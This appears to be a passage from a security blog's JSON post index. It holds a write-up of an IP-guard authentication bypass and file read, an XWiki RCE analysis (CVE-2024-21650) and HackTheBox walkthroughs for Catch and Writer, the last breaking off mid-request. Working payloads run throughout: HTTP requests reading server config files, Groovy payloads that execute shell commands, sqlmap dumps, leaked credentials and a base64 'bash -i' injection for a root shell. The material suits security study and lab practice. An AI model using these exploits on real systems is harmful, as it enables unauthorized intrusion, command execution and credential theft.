not logged in, it should redirect to the login page. However, when the requested method name is getdatarecord, the system returns the error code ErrorCode::OERR_NOT_LOGIN and terminates further execution, but it fails to redirect to the login page. This process clearly has a vulnerability, as it does not guide unauthenticated users to verify their identity as expected.The source code of the mApplyList controller is as follows:&lt;?phpclass mApplyList extends CI_Controller{    // --- snip ---    public function __construct()    {        parent::__construct();        // --- snip ---        $func = substr(strrchr(rtrim($arrURL['path'], '/'), '/'), 1);        $func = strtolower($func);        if (!isset($this-&gt;logID) || empty($this-&gt;logID) ||            !isset($this-&gt;language) || empty($this-&gt;language) ||            !isset($this-&gt;SuName) || empty($this-&gt;SuName)) {            if ($func != 'download') {                if ($func == 'getdatarecord') {                    $this-&gt;errorresult(ErrorCode::OERR_NOT_LOGIN);                    return;                }                redirect(\"appr/SignIn\");                return;            }             // --- snip ---        }    }}So, an attacker can bypass authentication by sending a request like the following to access the changepwd method.http://192.168.32.186:8080/ipg/appr/MApplyList/changepwd/getdatarecordFile ReadThe downloadFile_client method in the mApplyList controller is responsible for downloading files. The method retrieves the file path from the request and then reads the file content. However, the system does not properly validate the file path, allowing an attacker to read arbitrary files on the server.POST /ipg/appr/MApplyList/downloadFile_client/getdatarecord HTTP/1.1Host: 192.168.32.186:8080User-Agent: Mozilla/5.0 (Linux; Android 4.0.4) AppleWebKit/531.1 (KHTML, like Gecko) Chrome/22.0.889.0 Safari/531.1Accept-Encoding: gzip, deflateAccept: */*Connection: keep-aliveContent-Type: application/x-www-form-urlencodedUpgrade-Insecure-Requests: 1Content-Length: 88path=..%2Fapplication%2F/config/database.php&amp;filename=1&amp;action=download&amp;hidGuid=1v%0D%0APatch AnalysisIn version 4.82.0609.0 of IP-guard, the privilege bypass vulnerability has not been addressed, but the file reading vulnerability has been fixed. In the mApplyList controller, the downloadFile_client method has been modified to include validation of file paths, allowing only files from specified directories to be downloaded.Authentication bypass vulnerability still exists.Reference  https://mp.weixin.qq.com/s/PWiGtoHea-ZBaYTR5FwxLQ  https://codeigniter.org.cn/userguide3/general/routing.html"
  },
  
  {
    "title": "CVE-2024-21650 XWiki RCE",
    "url": "/posts/CVE-2024-21650/",
    "categories": "vulnerability, XWiki",
    "tags": "RCE",
    "date": "2024-01-10 11:33:00 +0800",
    





    
    "snippet": "OverviewXWiki is a Java-based, highly customizable and extensible enterprise-level Wiki platform, offering cross-database support, a powerful plugin system, a flexible template engine, and comprehe...",
    "content": "OverviewXWiki is a Java-based, highly customizable and extensible enterprise-level Wiki platform, offering cross-database support, a powerful plugin system, a flexible template engine, and comprehensive security management, suitable for knowledge management and collaboration across various business needs.This vulnerability, identified as XWIKI-21173, is a critical remote code execution (RCE) vulnerability present in the user registration process of XWiki. Specifically, it allows attackers to insert malicious scripts in the “name” field during user registration, which are subsequently executed on the server, potentially leading to unauthorized data access or system control. This vulnerability exposes a security flaw in XWiki’s handling of user input and script execution, posing a serious threat to the overall system security and necessitates immediate remediation to protect user data and system integrity.Technical AnalysisIn RegistrationConfig.xml, user inputs such as register_first_name and register_last_name were directly embedded into the registration success message, without appropriate sanitization or escaping. Attackers could inject malicious Groovy scripts through the registration form. When these scripts were executed on the server, they could trigger arbitrary commands, resulting in a remote code execution (RCE) vulnerability.&lt;registrationSuccessMessage&gt;#set($fullName = \"$request.get('register_first_name') $request.get('register_last_name')\"){{info}}$services.localization.render('core.register.successful', [\"[[$fullName&amp;gt;&amp;gt;$userSpace$userName]]\", $userName]){{/info}}&lt;/registrationSuccessMessage&gt;For this, we can generate the following payload based on the original configuration.  ]]{{/html}}{{async}}{{groovy}}\"touch /tmp/success\".execute().waitFor(){{/groovy}}{{/async}}  ]]{{/html}}{{async}}{{groovy}}throw new Exception(\"cat /etc/passwd\".execute().text){{/groovy}}{{/async}}Firstly, ]]{{/html}} is used to end any previously started HTML rendering. Following this, the  {{async}} tag begins an asynchronous code block, meaning the subsequent code will run asynchronously, not blocking the rest of the page. The  tag indicates that the following code is written in the Groovy language. Finally, the  {{/groovy}}{{/async}} tags conclude the Groovy script block and the asynchronous block.The modifications made to the RegistrationConfig.xml file in the GitHub commit for XWIKI-21173 significantly enhance the security and accuracy of the registration success message within XWiki. By shifting to a more secure method of constructing user links using $xwiki.getUserName and employing $services.localization.render for message templating, these changes mitigate potential vulnerabilities such as code injection. This approach not only ensures the safe embedding of user-generated content but also supports multilingual environments, demonstrating a commitment to improving both the security and versatility of the XWiki platform.git show b290bfd573c...omitted...diff --git a/xwiki-platform-core/xwiki-platform-administration/xwiki-platform-administration-ui/src/main/resources/XWiki/RegistrationConfig.xml b/xwiki-platform-core/xwiki-platform-administration/xwiki-platform-administration-ui/src/main/resources/XWiki/RegistrationConfig.xmlindex ae1e3b1d9a3..640c8d1bd36 100644--- a/xwiki-platform-core/xwiki-platform-administration/xwiki-platform-administration-ui/src/main/resources/XWiki/RegistrationConfig.xml+++ b/xwiki-platform-core/xwiki-platform-administration/xwiki-platform-administration-ui/src/main/resources/XWiki/RegistrationConfig.xml@@ -555,8 +555,9 @@&lt;passwordRuleOneUpperCaseEnabled&gt;0&lt;/passwordRuleOneUpperCaseEnabled&gt;&lt;/property&gt;&lt;property&gt;  -      &lt;registrationSuccessMessage&gt;#set($fullName = \"$request.get('register_first_name') $request.get('register_last_name')\")  -{{info}}$services.localization.render('core.register.successful', [\"[[$fullName&amp;gt;&amp;gt;$userSpace$userName]]\", $userName]){{/info}}&lt;/registrationSuccessMessage&gt;  +      &lt;registrationSuccessMessage&gt;#set($message = $services.localization.render('core.register.successful', 'xwiki/2.1', ['USERLINK', $userName]))  +#set($userLink = $xwiki.getUserName(\"$userSpace$userName\"))  +{{info}}$message.replace('USERLINK', \"{{html clean=false}}$userLink{{/html}}\"){{/info}}&lt;/registrationSuccessMessage&gt;Reference  https://jira.xwiki.org/browse/XWIKI-21173  https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-rj7p-xjv7-7229  https://github.com/xwiki/xwiki-platform/commit/b290bfd573c6f7db6cc15a88dd4111d9fcad0d31  https://attackerkb.com/topics/Hn4W1casCs/cve-2024-21650  https://www.xwiki.org/xwiki/bin/view/Documentation/UserGuide/Features/XWikiSyntax/?syntax=2.1&amp;section=Macros  https://extensions.xwiki.org/xwiki/bin/view/Extension/Localization/Scripting/"
  },
  
  {
    "title": "HTB Catch Walkthrough",
    "url": "/posts/HTB-Catch/",
    "categories": "CTF, HTB",
    "tags": "",
    "date": "2022-04-05 12:13:00 +0800",
    





    
    "snippet": "Information  name: Catch  OS: Linux  Difficulty: Medium  Points: 30  Release: 13 Mar 2022  IP: 10.10.11.150https://app.hackthebox.com/machines/450Summary  Enumerate and discover services.  Download...",
    "content": "Information  name: Catch  OS: Linux  Difficulty: Medium  Points: 30  Release: 13 Mar 2022  IP: 10.10.11.150https://app.hackthebox.com/machines/450Summary  Enumerate and discover services.  Download the APK file and analyze it.  Get key token through APK and get user credentials.  Get the Shell by user credentials.  Further information gathering to discover another user credentials.  Login to monitor the target process.  Discover key scripts and code audit to discover power extraction vulnerabilities.DetailsReconkali@kali:~/HTB/Catch$ sudo masscan -p 1-65535,U:1-65535 10.10.11.150 --rate 2000 -e tun0[sudo] password for kali:Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-03-21 16:06:16 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports/host]Discovered open port 22/tcp on 10.10.11.150Discovered open port 3000/tcp on 10.10.11.150Discovered open port 80/tcp on 10.10.11.150Discovered open port 5000/tcp on 10.10.11.150Discovered open port 8000/tcp on 10.10.11.150# Nmap 7.92 scan initiated Mon Mar 21 12:12:50 2022 as: nmap -sS -sV -p 22,80,3000,5000,8000 -oN tcp 10.10.11.150Nmap scan report for 10.10.11.150Host is up (0.45s latency).PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)80/tcp   open  http    Apache httpd 2.4.413000/tcp open  ppp?5000/tcp open  upnp?8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))After visiting http://10.10.11.150, I found a downloadable catchv1.0.apk, decompiled the apk with d2j-dex2jar.sh, and by searching the source code, I found a URL: https://status.catch.htb, and added it to /etc /hosts.# /etc/hosts10.10.11.150 status.catch.htbAfterwards, the APK file was further analyzed using MobSF. Three tokens of interest were found, and we will further exploit them later. Now let’s focus on https://status.catch.htb:8000.\"gitea_token\" : \"b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0\"\"lets_chat_token\" : \"NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==\"\"slack_token\" : \"xoxp-23984754863-2348975623103\"About https://status.catch.htb, I found that the Cachet framework is used. The overview sees the existence of SQL injection vulnerabilities and command execution vulnerabilities, for details see.https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.htmlsqlmap -u \"http://status.catch.htb:8000/api/v1/components?name=1&amp;1[0]=&amp;1[1]=a&amp;1[2]=&amp;1[3]=or+%27a%27=%3F%20and%201=1)\\*+--+\"Got Web Shellcurl -H \"Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==\" -i   http://10.10.11.150:5000/roomsrooms[{\"id\": \"61b86b28d984e2451036eb17\",\"slug\": \"status\",\"name\": \"Status\",\"description\": \"Cachet Updates and Maintenance\",\"lastActive\": \"2021-12-14T10:34:20.749Z\",\"created\": \"2021-12-14T10:00:08.384Z\",\"owner\": \"61b86aead984e2451036eb16\",\"private\": false,\"hasPassword\": false,\"participants\": []},{\"id\": \"61b8708efe190b466d476bfb\",\"slug\": \"android_dev\",\"name\": \"Android Development\",\"description\": \"Android App Updates, Issues &amp; More\",\"lastActive\": \"2021-12-14T10:24:21.145Z\",\"created\": \"2021-12-14T10:23:10.474Z\",\"owner\": \"61b86aead984e2451036eb16\",\"private\": false,\"hasPassword\": false,\"participants\": []},{\"id\": \"61b86b3fd984e2451036eb18\",\"slug\": \"employees\",\"name\": \"Employees\",\"description\": \"New Joinees, Org updates\",\"lastActive\": \"2021-12-14T10:18:04.710Z\",\"created\": \"2021-12-14T10:00:31.043Z\",\"owner\": \"61b86aead984e2451036eb16\",\"private\": false,\"hasPassword\": false,\"participants\": []}]curl -H \"Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==\" -i   http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages[// --- Omit ---{\"id\": \"61b8702dfe190b466d476bfa\",\"text\": \"Here are the credentials `john : E}V!mywu_69T4C}W`\",\"posted\": \"2021-12-14T10:21:33.859Z\",\"owner\": \"61b86f15fe190b466d476bf5\",\"room\": \"61b86b28d984e2451036eb17\"},{\"id\": \"61b87010fe190b466d476bf9\",\"text\": \"Sure one sec.\",\"posted\": \"2021-12-14T10:21:04.635Z\",\"owner\": \"61b86f15fe190b466d476bf5\",\"room\": \"61b86b28d984e2451036eb17\"},{\"id\": \"61b86fb1fe190b466d476bf8\",\"text\": \"Can you create an account for me ? \",\"posted\": \"2021-12-14T10:19:29.677Z\",\"owner\": \"61b86dbdfe190b466d476bf0\",\"room\": \"61b86b28d984e2451036eb17\"},{\"id\": \"61b86f4dfe190b466d476bf6\",\"text\": \"Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. \",\"posted\": \"2021-12-14T10:17:49.761Z\",\"owner\": \"61b86f15fe190b466d476bf5\",\"room\": \"61b86b28d984e2451036eb17\"}]Found the account password: john : E}V!mywu_69T4C}WThe api_key of john was found by SQL injection.sqlmap -u \"http://status.catch.htb:8000/api/v1/components?name=1&amp;1[0]=&amp;1[1]=a&amp;1[2]=&amp;1[3]=or+%27a%27=%3F%20and%201=1)\\*+--+\" --dbms=mysql -D cachet -T users -C api_key,username --dump+----------------------+----------+| api_key              | username |+----------------------+----------+| 7GVCqTY5abrox48Nct8j | john     |+----------------------+----------+POST /api/v1/incidents HTTP/1.1Host:status.catch.htb:8000Accept-Encoding: gzip, deflateAccept: \\*/\\*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection: closeX-Cachet-Token:7GVCqTY5abrox48Nct8jContent-Type: application/x-www-form-urlencodedContent-Length: 36visible=0&amp;status=1&amp;name=d&amp;template=dAfter getting the webshell, I found that the current environment is docker. execute the env command to get the system environment variables. Found the database password: s2#4Fg0_%3!GITHUB_TOKEN=nullREDIS_PORT=nullNEXMO_SMS_FROM=CachetAPP_DEBUG=falseMAIL_USERNAME=DB_PORT=nullNEXMO_SECRET=nullAPP_URL=http://localhostSHLVL=1OLDPWD=/var/www/html/CachetREDIS_DATABASE=nullDB_UNIX_SOCKET=nullAPACHE_RUN_DIR=/var/run/apache2DB_DATABASE=cachetMAIL_DRIVER=smtpAPACHE_PID_FILE=/var/run/apache2/apache2.pidCACHET_EMOJI=falseTRUSTED_PROXIES=SESSION_DRIVER=databaseDB_USERNAME=will_=lsCACHE_DRIVER=fileQUEUE_DRIVER=nullNEXMO_KEY=nullMAIL_ENCRYPTION=tlsPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binDB_DRIVER=mysqlMAIL_PASSWORD=APACHE_LOCK_DIR=/var/lock/apache2DEBUGBAR_ENABLED=falseLANG=CDB_PREFIX=nullMAIL_HOST=CACHET_BEACON=trueCACHET_AUTO_TWITTER=trueAPACHE_RUN_GROUP=www-dataAPACHE_RUN_USER=www-dataAPP_TIMEZONE=UTCAPACHE_LOG_DIR=/var/log/apache2[[email protected]](/cdn-cgi/l/email-protection)MAIL_PORT=nullREDIS_HOST=nullAPP_ENV=productionPWD=/etcAPP_KEY=base64:9mUxJeOqzwJdByidmxhbJaa74xh3ObD79OI6oG1KgyA=DB_PASSWORD=s2#4Fg0_%3!MAIL_NAME=nullDB_HOST=localhostCollate all the above information.usernames：john,will,rootpassword：s2#4Fg0_%3!Discover ssh account password:will:s2#4Fg0_%3!Privilege escalationBy monitoring the system processes, we found that the root user executes /opt/mdm/verify.sh at regular intervals.app_check() {  APP_NAME=$(grep -oPm1 \"(?&lt;=&lt;string name=\\\"app_name\\\"&gt;)[^&lt;]+\" \"$1/res/values/strings.xml\")  echo $APPrNAME  if [[ $APP_NAME == \\*\"Catch\"\\* ]]; then    echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'    mv \"$3/$APK_NAME\" \"$2/$APP_NAME/$4\"  else    echo \"[!] App doesn't belong to Catch Global\"    cleanup    exit  fi}We can control APP_NAME for command injection.&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;resources&gt;    &lt;string name=\"app_name\"&gt;Catch; echo  you base64 shell code | base64 -d | bash -i &lt;/string&gt;&lt;/resources&gt;After that, run apktool b to package the apk and put the apk in /opt/mdm/apk_bin. Wait a few moments to get root access.Reference  https://stackoverflow.com/questions/37302448/lets-chat-authentication-via-ajax-request  https://github.com/sdelements/lets-chat/wiki/API  https://mobsf.github.io/docs  https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html"
  },
  
  {
    "title": "HTB Writer Walkthrough",
    "url": "/posts/HTB-Writer/",
    "categories": "CTF, HTB",
    "tags": "",
    "date": "2021-08-13 12:13:00 +0800",
    





    
    "snippet": "Information  name: Writer  OS: Linux  Difficulty: Medium  Points: 30  Release: 2ND AUGUST, 2021  IP: 10.10.11.101https://app.hackthebox.eu/machines/WriterSummary  Enumerate to find the admin page. ...",
    "content": "Information  name: Writer  OS: Linux  Difficulty: Medium  Points: 30  Release: 2ND AUGUST, 2021  IP: 10.10.11.101https://app.hackthebox.eu/machines/WriterSummary  Enumerate to find the admin page.  Reading files and logging into the system via SQL injection.  Read source code to find command injection vulnerability and get web shell.  Read web path to discover configuration files. Read Mysql account secret login to get hash.  Use hashcat to crack the hash to get the password and get the user.txt.  Mapping port 25 out, execute a command via /etc/postfix/disclaimer to further elevate privileges and read john’s id_rsa.  Raise privileges via apt-get.DetailsRecon# Nmap 7.80 scan initiated Sat Aug 7 14:38:25 2021 as: nmap -sS -sV -sC -oN nmap 10.10.11.101Nmap scan report for writer.htb (10.10.11.101)Host is up (0.33s latency).Not shown: 996 closed portsPORT    STATE SERVICE     VERSION22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Story Bank | Writer.HTB139/tcp open  netbios-ssn Samba smbd 4.6.2445/tcp open  netbios-ssn Samba smbd 4.6.2Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: 57s|_nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb2-security-mode:|   2.02:|_    Message signing enabled but not required| smb2-time:|   date: 2021-08-07T06:39:40|_  start_date: N/A# Nmap 7.80 scan initiated Sat Aug 7 14:41:42 2021 as: nmap -sU -sV -sC -p 137 -oN nmap\\_udp 10.10.11.101Nmap scan report for writer.htb (10.10.11.101)Host is up (0.39s latency).PORT    STATE SERVICE    VERSION137/udp open  netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP)Service Info: Host: WRITERHost script results:|_nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Aug 7 14:41:44 2021 -- 1 IP address (1 host up) scanned in 2.16 seconds/etc/hosts10.10.11.101    writer.htb` wfuzz -w /usr/share/dirb/wordlists/big.txt -u http://writer.htb/FUZZ –hc 404 -t 200`Got Web Shelladmin ' or '1'='1POST /administrative HTTP/1.1Host: writer.htbUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86\\_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\\*/\\*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 18Origin: http://writer.htbConnection: closeReferer: http://writer.htb/administrativeUpgrade-Insecure-Requests: 1uname=demo&amp;password=demo/etc/apache2/sites-enabled/000-default.confsqlmap -r res.txt --file-read=/etc/apache2/sites-enabled/000-default.conf# Virtual host configuration for writer.htb domain&lt;VirtualHost *:80&gt;ServerName writer.htbServerAdmin [[email protected]](/cdn-cgi/l/email-protection)WSGIScriptAlias / /var/www/writer.htb/writer.wsgi&lt;Directory /var/www/writer.htb&gt;Order allow,denyAllow from all&lt;/Directory&gt;Alias /static /var/www/writer.htb/writer/static&lt;Directory /var/www/writer.htb/writer/static/&gt;Order allow,denyAllow from all&lt;/Directory&gt;ErrorLog ${APACHE_LOG_DIR}/error.logLogLevel warnCustomLog ${APACHE_LOG_DIR}/access.log combined&lt;/VirtualHost&gt;# Virtual host configuration for dev.writer.htb subdomain# Will enable configuration after completing backend development# Listen 8080#&lt;VirtualHost 127.0.0.1:8080&gt;#       ServerName dev.writer.htb#       ServerAdmin [[email protected]](/cdn-cgi/l/email-protection)#        # Collect static for the writer2_project/writer_web/templates#       Alias /static /var/www/writer2_project/static#       &lt;Directory /var/www/writer2_project/static&gt;#               Require all granted#       &lt;/Directory&gt;##       &lt;Directory /var/www/writer2_project/writerv2&gt;#               &lt;Files wsgi.py&gt;#                       Require all granted#               &lt;/Files&gt;#       &lt;/Directory&gt;##       WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env#       WSGIProcessGroup writer2_project#       WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py#        ErrorLog ${APACHE_LOG_DIR}/error.log#        LogLevel warn#        CustomLog ${APACHE_LOG_DIR}/access.log combined##&lt;/VirtualHost&gt;/var/www/writer.htb/writer/__init__.pyfrom flask import Flask, session, redirect, url_for, request, render_templatefrom mysql.connector import errorcodeimport mysql.connectorimport urllib.requestimport osimport PILfrom PIL import Image, UnidentifiedImageErrorimport hashlibapp = Flask(__name__,static_url_path='',static_folder='static',template_folder='templates')#Define connection for databasedef connections():  try:    connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')    return connector  except mysql.connector.Error as err:    if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:      return (\"Something is wrong with your db user name or password!\")    elif err.errno == errorcode.ER_BAD_DB_ERROR:      return (\"Database does not exist\")    else:      return (\"Another exception, returning!\")  else:    print ('Connection to DB is ready!')#Define homepage@app.route('/')def home_page():  try:    connector = connections()  except mysql.connector.Error as err:    return (\"Database error\")  cursor = connector.cursor()  sql_command = \"SELECT * FROM stories;\"  cursor.execute(sql_command)  results = cursor.fetchall()  return render_template('blog/blog.html', results=results)#Define about page@app.route('/about')def about():  return render_template('blog/about.html')#Define contact page@app.route('/contact')def contact():  return render_template('blog/contact.html')#Define blog posts@app.route('/blog/post/&lt;id&gt;', methods=['GET'])def blog_post(id):  try:    connector = connections()  except mysql.connector.Error as err:    return (\"Database error\")  cursor = connector.cursor()  cursor.execute(\"SELECT * FROM stories WHERE id = %(id)s;\", {'id': id})  results = cursor.fetchall()  sql_command = \"SELECT * FROM stories;\"  cursor.execute(sql_command)  stories = cursor.fetchall()  return render_template('blog/blog-single.html', results=results, stories=stories)#Define dashboard for authenticated users@app.route('/dashboard')def dashboard():  if not ('user' in session):    return redirect('/')  return render_template('dashboard.html')#Define stories page for dashboard and edit/delete pages@app.route('/dashboard/stories')def stories():  if not ('user' in session):    return redirect('/')  try:    connector = connections()  except mysql.connector.Error as err:    return (\"Database error\")  cursor = connector.cursor()  sql_command = \"Select * From stories;\"  cursor.execute(sql_command)  results = cursor.fetchall()  return render_template('stories.html', results=results)@app.route('/dashboard/stories/add', methods=['GET', 'POST'])def add_story():  if not ('user' in session):    return redirect('/')  try:    connector = connections()  except mysql.connector.Error as err:    return (\"Database error\")  if request.method == \"POST\":    if request.files['image']:      image = request.files['image']      if \".jpg\" in image.filename:        path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)        image.save(path)        image = \"/img/{}\".format(image.filename)      else:        error = \"File extensions must be in .jpg!\"        return render_template('add.html', error=error)    if request.form.get('image_url'):      image_url = request.form.get('image_url')      if \".jpg\" in image_url:        try:          local_filename, headers = urllib.request.urlretrieve(image_url)          os.system(\"mv {} {}.jpg\".format(local_filename, local_filename))          image = \"{}.jpg\".format(local_filename)          try:            im = Image.open(image)            im.verify()            im.close()            image = image.replace('/tmp/','')            os.system(\"mv /tmp/{} /var/www/writer.htb/writer/static/img/{}\".format(image, image))            image = \"/img/{}\".format(image)          except PIL.UnidentifiedImageError:            os.system(\"rm {}\".format(image))            error = \"Not a valid image file!\"            return render_template('add.html', error=error)        except:          error = \"Issue uploading picture\"          return render_template('add.html', error=error)      else:        error = \"File extensions must be in .jpg!\"        return render_template('add.html', error=error)    author = request.form.get('author')    title = request.form.get('title')    tagline = request.form.get('tagline')    content = request.form.get('content')    cursor = connector.cursor()    cursor.execute(\"INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,'Published',now(),%(image)s);\", {'author':author,'title': title,'tagline': tagline,'content': content, 'image':image })    result = connector.commit()    return redirect('/dashboard/stories')  else:    return render_template('add.html')@app.route('/dashboard/stories/edit/&lt;id&gt;', methods=['GET', 'POST'])def edit_story(id):  if not ('user' in session):    return redirect('/')  try:    connector = connections()  except mysql.connector.Error as err:    return (\"Database error\")  if request.method == \"POST\":    cursor = connector.cursor()    cursor.execute(\"SELECT * FROM stories where id = %(id)s;\", {'id': id})    results = cursor.fetchall()    if request.files['image']:      image = request.files['image']      if \".jpg\" in image.filename:        path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)        image.save(path)        image = \"/img/{}\".format(image.filename)        cursor = connector.cursor()        cursor.execute(\"UPDATE stories SET image = %(image)s WHERE id = %(id)s\", {'image':image, 'id':id})        result = connector.commit()      else:        error = \"File extensions must be in .jpg!\"        return render_template('edit.html', error=error, results=results, id=id)    if request.form.get('image_url'):      image_url = request.form.get('image_url')      if \".jpg\" in image_url:        try:          local_filename, headers = urllib.request.urlretrieve(image_url)          os.system(\"mv {} {}.jpg\".format(local_filename, local_filename))          image = \"{}.jpg\".format(local_filename)          try:            im = Image.open(image)            im.verify()            im.close()            image = image.replace('/tmp/','')            os.system(\"mv /tmp/{} /var/www/writer.htb/writer/static/img/{}\".format(image, image))            image = \"/img/{}\".format(image)            cursor = connector.cursor()            cursor.execute(\"UPDATE stories SET image = %(image)s WHERE id = %(id)s\", {'image':image, 'id':id})            result = connector.commit()          except PIL.UnidentifiedImageError:            os.system(\"rm {}\".format(image))            error = \"Not a valid image file!\"            return render_template('edit.html', error=error, results=results, id=id)        except:          error = \"Issue uploading picture\"          return render_template('edit.html', error=error, results=results, id=id)      else:        error = \"File extensions must be in .jpg!\"        return render_template('edit.html', error=error, results=results, id=id)    title = request.form.get('title')    tagline = request.form.get('tagline')    content = request.form.get('content')    cursor = connector.cursor()    cursor.execute(\"UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s\", {'title':title, 'tagline':tagline, 'content':content, 'id': id})    result = connector.commit()    return redirect('/dashboard/stories')  else:    cursor = connector.cursor()    cursor.execute(\"SELECT * FROM stories where id = %(id)s;\", {'id': id})    results = cursor.fetchall()    return render_template('edit.html', results=results, id=id)@app.route('/dashboard/stories/delete/&lt;id&gt;', methods=['GET', 'POST'])def delete_story(id):  if not ('user' in session):    return redirect('/')  try:    connector = connections()  except mysql.connector.Error as err:    return (\"Database error\")  if request.method == \"POST\":    cursor = connector.cursor()    cursor.execute(\"DELETE FROM stories WHERE id = %(id)s;\", {'id': id})    result = connector.commit()    return redirect('/dashboard/stories')  else:    cursor = connector.cursor()    cursor.execute(\"SELECT * FROM stories where id = %(id)s;\", {'id': id})    results = cursor.fetchall()    return render_template('delete.html', results=results, id=id)#Define user page for dashboard@app.route('/dashboard/users')def users():  if not ('user' in session):    return redirect('/')  try:    connector = connections()  except mysql.connector.Error as err:    return \"Database Error\"  cursor = connector.cursor()  sql_command = \"SELECT * FROM users;\"  cursor.execute(sql_command)  results = cursor.fetchall()  return render_template('users.html', results=results)#Define settings page@app.route('/dashboard/settings', methods=['GET'])def settings():  if not ('user' in session):    return redirect('/')  try:    connector = connections()  except mysql.connector.Error as err:    return \"Database Error!\"  cursor = connector.cursor()  sql_command = \"SELECT * FROM site WHERE id = 1\"  cursor.execute(sql_command)  results = cursor.fetchall()  return render_template('settings.html', results=results)#Define authentication mechanism@app.route('/administrative', methods=['POST', 'GET'])def login_page():  if ('user' in session):    return redirect('/dashboard')  if request.method == \"POST\":    username = request.form.get('uname')    password = request.form.get('password')    password = hashlib.md5(password.encode('utf-8')).hexdigest()    try:      connector = connections()    except mysql.connector.Error as err:      return (\"Database error\")    try:      cursor = connector.cursor()      sql_command = \"Select * From users Where username = '%s' And password = '%s'\" % (username, password)      cursor.execute(sql_command)      results = cursor.fetchall()      for result in results:        print(\"Got result\")      if result and len(result) != 0:        session['user'] = username        return render_template('success.html', results=results)      else:        error = \"Incorrect credentials supplied\"        return render_template('login.html', error=error)    except:      error = \"Incorrect credentials supplied\"      return render_template('login.html', error=error)  else:    return render_template('login.html')@app.route(\"/logout\")def logout():  if not ('user' in session):    return redirect('/')  session.pop('user')  return redirect('/')if __name__ == '__main__':  app.run(\"0.0.0.0\")        if request.form.get('image\\_url'):            image\\_url = request.form.get('image\\_url')            if \".jpg\" in image\\_url:                try:                    local\\_filename, headers = urllib.request.urlretrieve(image\\_url)                    os.system(\"mv {} {}.jpg\".format(local\\_filename, local\\_filename))                    image = \"{}.jpg\".format(local\\_filename)                    try:                        im = Image.open(image)                         im.verify()                        im.close()                        image = image.replace('/tmp/','')                        os.system(\"mv /tmp/{} /var/www/writer.htb/writer/static/img/{}\".format(image, image))                        image = \"/img/{}\".format(image)                    except PIL.UnidentifiedImageError:                        os.system(\"rm {}\".format(image))                        error = \"Not a valid image file!\"                        return render\\_template('add.html', error=error)                except:                    error = \"Issue uploading picture\"                    return render\\_template('add.html', error=error)            else:                error = \"File extensions must be in .jpg!\"                return render\\_template('add.html', error=error)POST /dashboard/stories/add HTTP/1.1Host: writer.htbUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86\\_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\\*/\\*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------4229921975180160461559477084Content-Length: 905Origin: http://writer.htbConnection: closeReferer: http://writer.htb/dashboard/stories/addCookie: session=eyJ1c2VyIjoiYWRtaW4nIC0tIC0ifQ.YRZmJQ.N6M7slyxhOtSWldWbognlVjbwdoUpgrade-Insecure-Requests: 1-----------------------------4229921975180160461559477084Content-Disposition: form-data; name=\"author\"hack-----------------------------4229921975180160461559477084Content-Disposition: 